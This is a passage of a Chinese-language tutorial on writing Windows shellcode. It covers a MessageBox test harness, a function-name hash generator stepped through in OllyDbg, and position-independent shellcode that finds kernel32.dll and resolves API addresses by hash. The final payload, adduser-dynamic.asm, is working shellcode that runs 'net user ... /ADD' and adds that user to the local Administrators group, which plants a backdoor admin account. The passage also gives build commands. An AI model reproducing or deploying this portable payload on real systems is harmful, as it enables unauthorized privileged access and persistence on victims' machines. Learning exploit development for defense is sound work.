char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x2a\x59\xbb\x77\x1d\x80\x7c\x51\xff\xd3\xeb\x2f\x59\x51\x50\xbb\xc0\xad\x80\x7c\xff\xd3\xeb\x34\x59\x31\xd2\x52\x51\x51\x52\xff\xd0\x31\xd2\x50\xb8\x82\xca\x81\x7c\xff\xd0\xe8\xd1\xff\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\xe8\xcc\xff\xff\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x00\xe8\xc7\xff\xff\xff\x48\x65\x79\x00";
int main(int argc, char **argv)
{
int (*func)();
func = (int (*)()) code;
(int)(*func)();
}
+----------------- End updated shellcodetest.c -----------------+

```

现在需要编译已经修改好的shellcodetest.c程序以使它可以执行我们的shellcode.可以用如下命令完成:

> gcc -o shellcodetest shellcodetest.c

创建可执行程序”shellcodetest.exe”

记住这个被设计来触发一个消息框,它含有”Hey”消息,之后他应该在没有触发core dump的情况下干净利索的退出.如果你遇到发生core dump,那么硬编码的函数地址可能是错的,同时你需要检查arwin程序对以上每个函数进行输出的结果

> ./shellcodetest.exe     (message box produced saying "Hey")

消息框引发提示”Hey”

    (click "Ok" and it should exit cleanly)

点击”OK”并干净利索地退出.

恭喜！

你已经设计好一些加载Windows库的shellcode了,动态找到Windows函数的地址,定义并找到字符串常量,并调用函数地址.

这可以让你在一个恰当的处境中开始设计你自己的shellcode.

然而,在上述代码中仍然还有一些硬编码的地址.接下来的教程将告诉你如何通过动态定位Kernel32.dll和GetProcAddress函数来删掉这些地址.也将告诉你如何使用汇编语言来构造函数让你可以重用你的代码.

0x04 生成函数Hash
=====

在前面的教程中,总还有指向已经想调用的windows函数的硬编码地址.这阻碍了shellcode在多种不同的windows操作系统,服务包,甚至是不同的补丁程序级别上的执行

这个教程的第一步是向学习更加动态的Windows shellcode结构更进一步了,它可以在多种windows操作系统版本,服务包和补丁程序级别上执行. 这个方法起初通过创建一个我们想要调用的函数名的hash来动态找到每个函数的地址,然后shellcode通过搜索相关的DLL(初始是 kernel32.dll）,为我们发现的每个函数名计算一个hash,同时用我们预先计算好的hash来与其进行比较.

我们的目的

我们shellcode的目的将是设计一个生成hash的程序（这个程序可以获取一个函数名字符串的列表并把一个符合的hash表压在栈上.这个表可以通过OllyDbg调试器看到这个程序也将示范多一些结构,它们是我们定义的函数和常量的区域.

我们正在编译这段汇编代码就好像它已经是shellcode了（仅仅是因为暂时抛出程序）;然而,它不会真的像shellcode那样有任何功能同时也仅仅是一个相当有用的程序.它被使用于创建函数hash（为了使用于其它shellcode中）

下一个教程（教程6）为了让shellcode完全动态（可以在所有服务包和windows98,windowsNT,windows 2000,windowsXP和Windows2003的补丁程序级别中生效）,将会把我们在这个教程中生成的函数hash转换成在教程3中的adduser.asm代码（它有已经硬编码了的函数地址）

从教程3来看,我们已经使用了”WinExec”和”ExitProcess”函数,所以为了在教程6中可以使用这些函数,我们将会为这些函数与一堆其他通常会被使用到的函数一起生成hash

在代码中应该注意什么

这些已经通过”FUNCTION:function_name”和“DEFINE CONSTANTS”部分展示出来了,下面的汇编代码是由使用汇编语言写的函数和常量构成的. 当设计shellcode时,函数是有帮助的,因为他们允许简单的代码重用,当你多次使用函数时，可以帮助你减少shellcode的代码量。它们也允许你把它们复制到你设计的其他shellcode中,这使得未来的shellcode更容易编写.

仅仅要关心的是当设计的shellcode需要尽可能小的代码量时,它使用一个函数不会设计的比仅仅做内联动作产生更多的代码（正如我们已经完成的get_current_address函数那样...但是那不在这种情况之内).使用诸如”call get_current_address”这样的标志定义函数,同时通过”call”操作符调用它,例如”call get_current_address”当call操作符被使用时,它首先把当前的地址压入到堆栈中以便让它知道返回地址.这个函数通过使用”ret”操作符返回到函数调用的初始位置

一些函数将会把输入值作为”参数”.这些参数可能仅仅是函数预期的一个位于特定寄存器内的值.然而,通常情况下会通过被压到栈上（使用”push”操作符例如”push eax”）的值把参数传递到函数中.多种不同的参数可能会被压入到栈上的多种不同的值传递到一个函数中.然后函数将通过使用”pop”操作符将这些参数值从栈上攫取（弹出),例如”pop ecx”.函数也可能把返回值压到栈上以便让程序可以调用,然后让返回值弹出.通常发现函数的返回值遗留在”eax”寄存器中使用”db”操作符定义常量,它不过是把未经修改的字符串的字节写入到代码中,正如下所示.”db 0x00”在末尾写了一个null字节来终止字符串..然后我们使用一个标记来定位这些字节并作为一个完整的字符串来使用它们.

> locate_constants: ;label start of constants     db "WinExec"     db 0x00

汇编语言也有许多分散在各处的”int 3”操作符.”int 3”被称作是”断点’,它通知寄存器在某个指令停止运行.这允许你查看被执行的指令,寄存器状态,堆栈状态,也可以在内存中从头到尾地查找第一个断点被定位在主程序开始的地方.这允许你从头到尾对一行行的代码进行单步调试（从程序开始到程序结束,遇到call则步进）,这是一种明白每条指令正在做些什么的好方法.

你将意识到我已经把两个断点接连着放在了一排

OllyDbg常常在窗口顶部显示当前执行的指令,这意味着如果我们仅仅有一个断点,”int 3”指令将不会被显示出来因为它已经被执行了.

这对于OllyDbg调试器的新手来说可能感到困惑,因此我已经放了两个断点,以便在第一个断点已经被触发时,可以让第二次的”int 3”指令显示给

第三次设的断点在程序的尾部.这可以让我们看到栈中包含了产生函数hashes和相对应的函数字符串

Shellcode

接下来是hash-generator.asm的代码

使用如下代码在你的本地系统上的Cygwin shellcode目录内创建hash-generator.asm.确保你已经从头到尾地阅读了代码的注释因为它们解释了每一行代码执行动作的内容，同时为之后的shellcode开发给予了有用的提示.

```
+--------------- Start hash-generator.asm --------------+
;hash-generator.asm
[SECTION .text]
BITS 32
global _start
_start:
jmp start_asm
;DEFINE FUNCTIONS
;FUNCTION: get_current_address
get_current_address:
    push 0 ;create a spot for our result
    push eax ;save eax value
    mov eax, [esp+8] ;copy the return address into eax
    mov dword [esp+4], eax ;move return address into result spot
    pop eax ;restore original eax value
    ret ;return to instruction that called this function
;END FUNCTION: get_current_address
;FUNCTION: compute_hash
compute_hash:
    push 0 ;create an empty spot for our result
pushad ;save current registers onto stack
    mov eax, [esp+36] ;copy the return address into eax
    mov dword [esp+32], eax ;move return address into our empty spot.
     ;orig return addr spot will be our result spot
    xor edi, edi ;edi will hold our hash result edi
    xor eax, eax ;eax holds our current char eax
    cld
compute_hash_again:
    lodsb ;puts current char into eax 
    test al, al ;checks for null - end of function string
    jz compute_hash_finished
    ror edi, 0xd ;rotate the current hash
    add edi, eax ;adds current char to current hash
    jmp compute_hash_again
compute_hash_finished: ;end of compute hash function
     ;edi now holds hash in 'reverse' ordered
    mov edx, edi ;move the result hash into edx
reverse_next_hash_section:
    mov al, dl ;move the first 8 bits into lower part of eax
    shr edx, 8 ;shift edx right to align next 8 bits of hash
    test dl, dl ;check for null - finished hash reversal
    jz reverse_hash_finished
    shl eax, 8 ;shift eax left ready for next hash section
    jmp short reverse_next_hash_section ; loop back to move next section
reverse_hash_finished: ;final hash is now in eax in correct order
    mov dword [esp+36], eax ;move return value into our return spot.
    popad ;restore the original register values
    ret ;return to instruction that called this function
;END FUNCTION: compute_hash
;DEFINE CONSTANTS
locate_constants: ;label start of constants
    call get_current_address ;find current location in memory
    pop esi ;esi is pointer to function strings
    add esi, 9 ;move pointer over these commands
    jmp short locate_constants_return ;return to our main code
    ;Function String
    db "LoadLibraryA" ;result hash = 0x8e4e0eec
    db 0x00
    db "WriteFile" ;result hash = 0x1f790ae8
    db 0x00
    db "CloseHandle" ;result hash = 0xfb97fd0f
    db 0x00
    db "Sleep" ;result hash = 0xb0492ddb
    db 0x00
    db "ReadFile" ;result hash = 0x1665fa10
    db 0x00
    db "GetStdHandle" ;result hash = 0x23d88774
    db 0x00
    db "CreatePipe" ;result hash = 0x808f0c17
    db 0x00
    db "SetHandleInformation" ;result hash = 0x44119e7f
    db 0x00
    db "WinExec" ;result hash = 0x98FE8A0E
    db 0x00
    db "ExitProcess" ;result hash = 0x7ED8E273
    db 0x00
    ;Null to indicate end of list
    db 0x00
;END DEFINE CONSTANTS
start_asm:
    int 3 ;start of main program
    int 3 ;second int 3 purely just to show up in OllyDbg
    jmp locate_constants ;find starting location of constants
locate_constants_return: ;define where to return after locating constants
next_hash: ;marks the start of the loop for next hash
    push esi ;push esi as parameter to compute_hash function
    call compute_hash ;compute_hash(esi_string)
     ;result now located in first position on stack
    int 3 ;tell debugger to stop for each hash created
    int 3 ;second int 3 purely just to show up in OllyDbg
    xor eax,eax ;clear eax
check_null: ;moves pointer to start of next function string
    lodsb ;puts current char into eax
    test al,al ;test if we point to a null
    jz is_null ;if we found a null, we reached end of string
    jmp short check_null ;loop back and check next char
is_null:
    lodsb ;puts current char into eax
    dec esi ;move it back one spot
    test al,al ;test if we point to a null
    jnz next_hash ;2 nulls means end, else loop back for next hash
end:
    int 3 ;calculated function hashes listed on stack
    int 3 ;tell debugger to stop to show hashes on stack
    int 3 ;second int 3 purely just to show up in OllyDbg
+--------------- End hash-generator.asm --------------+

```

编译汇编代码

因此现在已经有我们用汇编语言写好的shellcode了，我们需要编译它.这可以使用nasm汇编编译器来完成,在有msgbox.asm（是你的汇编源代码文件）的目录下使用如下命令,msgbox.bin是已经编译好的二进制输出文件

> nasm -f bin -o hash-generator.bin hash-generator.asm

获取shellcode

现在我们有了一个编译好的二进制文件,可以使用xxd工具来为我们生成shellcode文件.这可以使用以下的xxd命令来完成,同时将会生成以下输出:

```
xxd -i hash-generator.bin
unsigned char hash_generator_bin[] = {
     0xe9, 0xc7, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x00, 0x50, 0x8b,
     0x44, 0x24, 0x08, 0x89, 0x44, 0x24, 0x04, 0x58, 0xc3, 0x68, 0x00, 0x00,
     0x00, 0x00, 0x60, 0x8b, 0x44, 0x24, 0x24, 0x89, 0x44, 0x24, 0x20, 0x31,
     0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d,
     0x01, 0xc7, 0xeb, 0xf4, 0x89, 0xfa, 0x88, 0xd0, 0xc1, 0xea, 0x08, 0x84,
     0xd2, 0x74, 0x05, 0xc1, 0xe0, 0x08, 0xeb, 0xf2, 0x89, 0x44, 0x24, 0x24,
     0x61, 0xc3, 0xe8, 0xb6, 0xff, 0xff, 0xff, 0x5e, 0x81, 0xc6, 0x09, 0x00,
     0x00, 0x00, 0xeb, 0x7b, 0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72,
     0x61, 0x72, 0x79, 0x41, 0x00, 0x57, 0x72, 0x69, 0x74, 0x65, 0x46, 0x69,
     0x6c, 0x65, 0x00, 0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64,
     0x6c, 0x65, 0x00, 0x53, 0x6c, 0x65, 0x65, 0x70, 0x00, 0x52, 0x65, 0x61,
     0x64, 0x46, 0x69, 0x6c, 0x65, 0x00, 0x47, 0x65, 0x74, 0x53, 0x74, 0x64,
     0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x00, 0x43, 0x72, 0x65, 0x61, 0x74,
     0x65, 0x50, 0x69, 0x70, 0x65, 0x00, 0x53, 0x65, 0x74, 0x48, 0x61, 0x6e,
     0x64, 0x6c, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69,
     0x6f, 0x6e, 0x00, 0x57, 0x69, 0x6e, 0x45, 0x78, 0x65, 0x63, 0x00, 0x45,
     0x78, 0x69, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x00, 0x00,
     0xcd, 0x03, 0xe9, 0x77, 0xff, 0xff, 0xff, 0x56, 0xe8, 0x3c, 0xff, 0xff,
     0xff, 0xcd, 0x03, 0x31, 0xc0, 0xac, 0x84, 0xc0, 0x74, 0x02, 0xeb, 0xf9,
     0xac, 0x4e, 0x84, 0xc0, 0x75, 0xe9, 0xcd, 0x03, 0xcd, 0x03
};
unsigned int hash_generator_bin_len = 238;

```

这产生一个可以被使用于一个c程序内的字符数组.

输出的每个十六进制的数字（0xXX）在shellcode内代表一个字节.

那么我们会想怎样处理这个输出来产生shellcode呢?我们将使用如下脚本，这个是我放在一起用来去除可以直接地放入我们的“shellcodetest.c”程序中未经修改的shellcode的脚本

这个程序使"hash-generator.bin"起作用,因此运行如下命令,它应该产生如下输出,这个输出将自动化地被存储到”hash-generator.shellcode”中.由于在你的系统上调用的函数地址不同,所以如果你正使用一个和我不同的系统或服务包，这个输出可能会略有变化

```
./xxd-shellcode.sh hash-generator.bin
\xe9\xc7\x00\x00\x00\x68\x00\x00\x00\x00\x50\x8b\x44\x24\x08\x89\x44\x24\x04\x58\xc3\x68\x00\x00\x00\x00\x60\x8b\x44\x24\x24\x89\x44\x24\x20\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x89\xfa\x88\xd0\xc1\xea\x08\x84\xd2\x74\x05\xc1\xe0\x08\xeb\xf2\x89\x44\x24\x24\x61\xc3\xe8\xb6\xff\xff\xff\x5e\x81\xc6\x09\x00\x00\x00\xeb\x7b\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x00\x57\x72\x69\x74\x65\x46\x69\x6c\x65\x00\x43\x6c\x6f\x73\x65\x48\x61\x6e\x64\x6c\x65\x00\x53\x6c\x65\x65\x70\x00\x52\x65\x61\x64\x46\x69\x6c\x65\x00\x47\x65\x74\x53\x74\x64\x48\x61\x6e\x64\x6c\x65\x00\x43\x72\x65\x61\x74\x65\x50\x69\x70\x65\x00\x53\x65\x74\x48\x61\x6e\x64\x6c\x65\x49\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x00\x57\x69\x6e\x45\x78\x65\x63\x00\x45\x78\x69\x74\x50\x72\x6f\x63\x65\x73\x73\x00\x00\xcd\x03\xe9\x77\xff\xff\xff\x56\xe8\x3c\xff\xff\xff\xcd\x03\x31\xc0\xac\x84\xc0\x74\x02\xeb\xf9\xac\x4e\x84\xc0\x75\xe9\xcd\x03\xcd\x03

```

创建带有shellcode的可执行程序 使用”shellcodetest.c”程序来测试我们的shellcode.这个步骤的目的是为了把我们的shellcode插入到一个c程序中,然后可以编译并执行这个c程序.为了执行我们的shellcode,这个程序已经设计好了. 这样做之前,需要把你的shellcode插入（从上个步骤生成的）到这个程序中.你把它放到”code[]”数组的引号之间.最后应该看起来像如下代码中所示的那样:

```
+----------------- Start updated shellcodetest.c -----------------+
/*shellcodetest.c*/
char code[] = "\xe9\xc7\x00\x00\x00\x68\x00\x00\x00\x00\x50\x8b\x44\x24\x08\x89\x44\x24\x04\x58\xc3\x68\x00\x00\x00\x00\x60\x8b\x44\x24\x24\x89\x44\x24\x20\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x89\xfa\x88\xd0\xc1\xea\x08\x84\xd2\x74\x05\xc1\xe0\x08\xeb\xf2\x89\x44\x24\x24\x61\xc3\xe8\xb6\xff\xff\xff\x5e\x81\xc6\x09\x00\x00\x00\xeb\x7b\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x00\x57\x72\x69\x74\x65\x46\x69\x6c\x65\x00\x43\x6c\x6f\x73\x65\x48\x61\x6e\x64\x6c\x65\x00\x53\x6c\x65\x65\x70\x00\x52\x65\x61\x64\x46\x69\x6c\x65\x00\x47\x65\x74\x53\x74\x64\x48\x61\x6e\x64\x6c\x65\x00\x43\x72\x65\x61\x74\x65\x50\x69\x70\x65\x00\x53\x65\x74\x48\x61\x6e\x64\x6c\x65\x49\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x00\x57\x69\x6e\x45\x78\x65\x63\x00\x45\x78\x69\x74\x50\x72\x6f\x63\x65\x73\x73\x00\x00\xcd\x03\xe9\x77\xff\xff\xff\x56\xe8\x3c\xff\xff\xff\xcd\x03\x31\xc0\xac\x84\xc0\x74\x02\xeb\xf9\xac\x4e\x84\xc0\x75\xe9\xcd\x03\xcd\x03";
int main(int argc, char **argv)
{
int (*func)();
func = (int (*)()) code;
(int)(*func)();
}
+----------------- End updated shellcodetest.c -----------------+

```

现在需要编译已经修改好的shellcodetest.c程序以便可以在程序中执行我们的shellcode.通常这将会在Cygwin目录中使用gcc来完成;然而,这次我们想在windows上运行可执行文件.因此除使用gcc之外,我们将使用在教程1中已经安装好的windows c编译器”lcc-win32”

你可以从"Start->All Programs->lcc-win32->lcc-win32"开始使用LCC.你可能创建一个新项目,所有创建命名为”hash_generator”或File菜单中的其他任务.如果它提醒你创建一个”application skeleton”你选择no,因为我们已经有了c代码同时也只是想编译它.接下来使用默认选项来完成剩余的操作.

已经开始运行LCC时，你想要使用File菜单来打开shellcodetest.c文件,可以在例如"C:\cygwin\home{username}\shellcode\shellcodetest.c"这样的位置找到它

当你打开这个文件时,LCC或许将给你一个警告”1 lines longer than 500 characters were truncated”.忽略它吧.实际上并没有截断我们的shellcode.

为了编译这段代码,点击”Compile”菜单选择”Compile shellcodetest.c”.你现在的shellcode目录中应该有一个命名为”lcc”的项目目录,该目录现在应该包含有shellcodetest.exe程序通常我们将仅仅执行这个程序以在中途执行我们的shellcode;然而这次这样做是没有用的,因为我们想看到在栈上生成的hash结果.我们通过使用OllyDbg调试器来实现这个目的.

用OllyDbg执行并分析shellcode

你可以仅仅双击在教程1中已经下载好的zip文件开始使用OllyDbg调试器.一旦开始使用了，当你你想使用File菜单来打开shellcodetest.exe时,可以在例如:”C:\cygwin\home{username}\shellcode\lcc\shellcodetest.exe”这样的位置上找到它，你已经用OllyDbg打开了你的可执行程序,应该可以看到如下图所示的内容,它含有一些红色指针指向的内容.

![enter image description here](http://drops.javaweb.org/uploads/images/68dbe0ecd26016737a67c441c682f8731724f904.jpg)

上图可以看到可执行程序已经被加载到OllyDbg中了.

窗口的左上方显示了在机器上将会被执行的指令.通过双击任意这个窗口的最左边的任意地址可以实时地在任意一条指令上设立断点.它将显示红色.再次双击则取消断点。可以通过双击指令本身随时更改任意指令.

窗口的右上方显示着寄存器和它们带有的值.这允许你确切地看到在寄存器中的每条指令的内容.如果一条指令执行之后寄存器的值改变了那么寄存器将以红色高亮.

窗口的右下方是栈窗口.这可以让你实时地看到被压入,存储和弹出栈的内容.这可以确切地理解栈是怎样被控制操作的.一旦你理解透彻了这个原理,它将会帮助你理解如何编写出更有效率的shellcode来窗口的左下方是一个内存转储区域,它可以让你在内存中看到并搜索未经修改的字节.你可以点击任意寄存器,堆栈,或代码访问并选择” show in dump” ”Play”按钮使程序开始并持续运行,直到它到达一个断点,一个访问违规,或程序的结束.这也可以通过按下F9键来完成.

“stop into”按钮将在任意时间上执行一条指令;然而,如果它到达了”call”指令,它将步入函数,同时执行每条指令,这可以通过按下F7键来实现.

“stop over”按钮也将在任意时间上执行一条指令;然而,如果他到达了”call”指令,它将”step over”函数,这意味着它将执行函数而不会显示出每条指令来.

在这个教程中,我们将按下”Play”（或 F9）按钮来开始我们的程序.因为我们已经把”int 3”指令（断点）写入到了我们的shellcode中,调试器将在到达第一断点时停止执行.如下图所示:

![enter image description here](http://drops.javaweb.org/uploads/images/30ee03a5b447cfecef6071ae27350e88b9d36dab.jpg)

上图展示了我们的断点之一(int 3）

这是我们shellcode开始的main部分,我们在上面已经创建它了.

如果你想确切地通过执行整个程序的每条指令来看到它们在每个寄存器和栈发生什么,你可以持续地按”step into(F7)”或”step Over(F8）”按钮. 记住在代码中我们有了两个并排的断点.这会发生在第一个int 3停止之后.它将仍然为用户显示一个”int 3”,正如上图中所示的那样以致于我们立即知道了它是因为断点而停止的.

除此之外,如果它因为一个错误而停止那么之后在OllyDbg底部的状态栏上会出现一个错误消息。

如果你想再次开始执行程序,那么点击两下Play按钮（因为我们有两个断点).

![enter image description here](http://drops.javaweb.org/uploads/images/cdc5938e2247d0efd693595fa086bd193333ff93.jpg)

这次可以清楚地看到两个断点了.call指令在断点之前是”call compute_hash”指令.这个函数计算hash并把它压到栈上.你可以在”Stack Window”中看到它,也可以看到函数字符串(被计算出的函数hash）已经被压到了栈上.你需要记住的是栈就像是堆放起来的一副扑克牌.最后被压在栈上的”牌”是栈顶的第一个参数,也将会第一个从栈中弹出的.你也可以通过改变”esp”（扩展的栈指针）寄存器来控制栈顶.

因此可以看到已经找到的第一个函数的字符串,它也已经被压入了栈中,同时对应的hash已经计算出来并压在了栈上.如果你现在点了两次Play你将看到下一个函数名和已经压入到栈中的hash.如果你继续这样做,应该开始看以下东西,如下所示：那是一个函数名表和hash(被定位在栈上的）

![enter image description here](http://drops.javaweb.org/uploads/images/07d68c0f4d138e66630241f86f3f1af6f7737560.jpg)

如果你点击Play甚至可以来到函数名字表尾,同时程序将向下转移到表尾,正如图中所显示的三个断点那样.这可以让你明白完整的函数名列表和hash,如下图所示：

![enter image description here](http://drops.javaweb.org/uploads/images/3414553f376dbe830d9e016fcc001236cdd198ad.jpg)

恭喜！

你仅仅创建了一个生成hash的程序,它定义,查找,并使用一个函数名字符串同时剔除掉在栈上的对应hash.你已经通过在OllyDbg中执行程序学会了OllyDbg的基础,它让你清楚地看到了寄存器和栈

在创建shellcode的同时,你也学习到了怎样使用一个更加体系化的方法,即创建允许代码重用且更有效率的shellcode

在创建shellcode时因为你要找到你需要调用的windows函数也需要对应的hash,所以将不断地使用到这个程序.这是创建可以跨不同windows操作系统的shellcode程序的第一步.

教程6将向你展示如何把这件事正确地做出来！我们将通过改变adduser.asm代码来删掉硬编码的地址.所以我们将会需要在这个教程中生成的”winExec”和”ExitProcess”函数的hash

玩的愉快！

0x05 动态shellcode
=====

截至目前为止我们已经创建了包含已经硬编码的windows函数地址shellcode.硬编码的内存地址把shellcode限制在特定的windows，服务包甚至在可能的补丁程序级别环境下运行.

我们的目的

我们的目的将是创建”Windows Command Execution Shellcode”(从教程3中）.它没有把任何内存地址硬编码以便让我们的shellcode可以跨windows 系统移植

首先通过内存中找到Kernel32.dll,之后在Kernel32.dll中遍历找到每个函数名,同时用我们在上一个教程中生成的函数hash来与每个函数hash比较。 创建函数hash

从教程3中,我们已经在本地系统上使用”WinExec”和”ExitProcess”函数添加了一个拥有管理员权限的用户.在教程5中我们已经为这些函数创建了hash,也学习到了在我们的shellcode中定义常量的方法.下面小段的代码向我们示范了在当前的shellcode内定义hash常量

```
+------------------ [snip] ------------------+
;DEFINE CONSTANTS
    locate_hashes:
        call locate_hashes_return
        ;WinExec        ;result hash = 0x98FE8A0E
        db 0x98
        db 0xFE
        db 0x8A
        db 0x0E
        ;ExitProcess        ;result hash = 0x7ED8E273
        db 0x7E
        db 0xD8
        db 0xE2
        db 0x73
    ;END DEFINE CONSTANTS
+------------------ [snip] ------------------+

```

因此我们怎样找到Kernel32.dll和函数的地址呢?

Kernel32.dll总是在windows引导起来的时候被加载了,所有的Windows操作系统（在vista前）把Kernel32.dll加载到内存里的一个预定的位置中.可以定位Kernel32.dll,然后从这里步入找到包含在Kernel32.dll中的每个函数名字.这让我们可以在Kernel32.dll中找到所有函数的地址.

当我们完整循环完每个函数时,对每个函数名计算hash并拿它和我们预先计算好的同时也搜索到的第一个函数hash作比较.在这个阶段,我们再次找到我们的第二个函数hash,接着是第三个函数,直到已经到达了我们hash表尾.

The assembly code for this tutorial contains the following new functions that allow us to perform the above actions: 这个教程的汇编代码包含以下新函数,它们允许我们执行上述动作：

find_kernel32     find_function     resolve_symbols_for_dll

Shellcode数据流

我们的shellcode中的第一个命令跳过所有已经用汇编代码定义的函数和在”main”中的汇编代码常量.对于这一点我们需要在我们函数地址的栈上分配空间.每个函数地址是4字节的,因此在用于存储两个函数地址的栈上分配8个字节.如果未来的shellcode使用一个额外的函数,那么这个值在栈上应该用12个字节表示-值得关心的是10进制标志和16进制标志

下一条指令把ebp作为一个栈帧指针.它在栈上作为一个不会改变的标志器.这允许我们引用跟ebp寄存器有关系的函数地址

正如下所示:

然后我们的shellcode调用”find_kernel32”,它把Kernel32.dll的地址放在eax寄存器中.之后我们找到我们的不变的函数hash,然后调用”resolve_symbols_for_dll”.这个函数使用”find_function”,它在Kernel32.dll中遍历以找到使用我们hash的函数地址并在栈上把函数地址放到我们已经分配好的位置上.

我们的函数地址可以用如下调用指令调用:

```
call [ebp+4]     ;WinExec
call [ebp+8]     ;ExitProcess

```

正如我们在教程3中所做的那样,我们现在可以开始用我们的自定义shellcode来调用这些函数以创建一个新用户,但是这次我们不能使用硬编码的函数地址了.记住下面的shellcode代码

The Shellcode

```
+--------------- Start adduser-dynamic.asm --------------+
;adduser-dynamic.asm
[SECTION .text]
BITS 32
global _start
_start:
    jmp start_asm
;DEFINE FUNCTIONS
;FUNCTION: find_kernel32
find_kernel32:
    push esi
    xor eax, eax
    mov eax, [fs:eax+0x30]
    test eax, eax
    js find_kernel32_9x
find_kernel32_nt:
    mov eax, [eax + 0x0c]
    mov esi, [eax + 0x1c]
    lodsd
    mov eax, [eax + 0x8]
    jmp find_kernel32_finished
find_kernel32_9x:
    mov eax, [eax + 0x34]
    lea eax, [eax + 0x7c]
    mov eax, [eax + 0x3c]
find_kernel32_finished:
    pop esi
    ret
;END FUNCTION: find_kernel32
;FUNCTION: find_function
find_function:
    pushad
    mov ebp, [esp + 0x24]
    mov eax, [ebp + 0x3c]
    mov edx, [ebp + eax + 0x78]
    add edx, ebp
    mov ecx, [edx + 0x18]
    mov ebx, [edx + 0x20]
    add ebx, ebp
find_function_loop:
    jecxz find_function_finished
    dec ecx
    mov esi, [ebx + ecx * 4]
    add esi, ebp ; esi now points to current function string
     ; start of compute hash function
compute_hash: ; put this into a function
    xor edi, edi ; edi will hold our hash result
    xor eax, eax ; eax holds our current char
    cld
compute_hash_again:
    lodsb ; puts current char into eax (except first time)
    test al, al ; checks for null - end of function string
    jz compute_hash_finished
    ror edi, 0xd ; rotate the current hash
    add edi, eax ; adds current char to current hash
    jmp compute_hash_again
compute_hash_finished: ; end of compute hash function
find_function_compare:
    ;this is where it compares the calculated hash to our hash
    cmp edi, [esp + 0x28]
    jnz find_function_loop
    mov ebx, [edx + 0x24]
    add ebx, ebp
    mov cx, [ebx + 2 * ecx]
    mov ebx, [edx + 0x1c]
    add ebx, ebp
    mov eax, [ebx + 4 * ecx]
    add eax, ebp
    ;this is the VMA of the function
    mov [esp + 0x1c], eax
find_function_finished:
    popad
    ret
    
;END FUNCTION: find_function
;FUNCTION: resolve_symbols_for_dll
resolve_symbols_for_dll:
    ;about to load current hash into eax (pointed to by esi)
    lodsd
    push eax
    push edx
    call find_function
    mov [edi], eax
    add esp, 0x08
    add edi, 0x04
    cmp esi, ecx
    jne resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
    ret
;END FUNCTION: resolve_symbols_for_dll
;DEFINE CONSTANTS
    
locate_hashes:
    call locate_hashes_return
    ;WinExec ;result hash = 0x98FE8A0E
    db 0x98
    db 0xFE
    db 0x8A
    db 0x0E
    ;ExitProcess ;result hash = 0x7ED8E273
    db 0x7E
    db 0xD8
    db 0xE2
    db 0x73
;END DEFINE CONSTANTS
start_asm: ; start our main program
    sub esp, 0x08 ; allocate space on stack for function addresses
    mov ebp, esp ; set ebp as frame ptr for relative offset on stack
    call find_kernel32 ;find address of Kernel32.dll
    mov edx, eax
    ;resolve kernel32 symbols
    jmp short locate_hashes ;locate address of our hashes
locate_hashes_return: ;define return label to return to this code
    pop esi ;get constants address from stack
    lea edi, [ebp + 0x04] ;this is where we store our function addresses
    mov ecx, esi
    add ecx, 0x08 ;length of dns shellcode hash list
    call resolve_symbols_for_dll
;add user section
    jmp short GetCommand
CommandReturn:
    pop ebx ;ebx now holds the handle to the string
    xor eax,eax ;empties out eax
    push eax ;push null onto stack as empty parameter value
    push ebx ;push the command onto the stack
    call [ebp+4] ;call WinExec(path,showcode)
    xor eax,eax ;zero the register again, clears winexec retval
    push eax ;push null onto stack as empty parameter value
call [ebp+8] ;call ExitProcess(0);
GetCommand:
    call CommandReturn
    db "cmd.exe /c net user PSUser PSPasswd /ADD && net localgroup Administrators /ADD PSUser"
    db 0x00
+--------------- End adduser-dynamic.asm --------------+

```

编译汇编代码

在前面的教程中,我们可以手动地用nasm编译汇编代码来完成每一个步骤,使用xxd和xxd-shellcode.sh来去除未经修改的shellcode,把未经修改的shellcode插入到shellcodetest.c中,然后用gcc编译这个测试程序.每次要完成对shellcode作出略微的更改是有点难度的.

因为这个原因,我已经创建了”shellcode-compiler.sh”,它可以为你做所有这些步骤！你应该已经在教程1中下载了这个脚本,和任意其它必须的脚本和程序.这个程序的用法如下所示：

```
$ ./shellcode-compiler.sh
      Usage: ./shellcode-compiler.sh filename.asm
      Eg, ./shellcode-compiler.sh shellcode.asm

```

把汇编文件作为一个输入到编译器的文件,同时创建”filename.shellcode”形式的Cygwin环境下的可执行文件.这个教程的汇编文件可以使用如下命令编译,并输出如下所示

> $ ./shellcode-compiler.sh adduser-dynamic.asm

把 adduser-dynamic.asm 编译成 adduser-dynamic.bin

[nasm -f bin -o adduser-dynamic.bin adduser-dynamic.asm]

把adduser-dynamic.bin 转换成 adduser-dynamic.shellcode

```
[./xxd-shellcode.sh adduser-dynamic.asm]
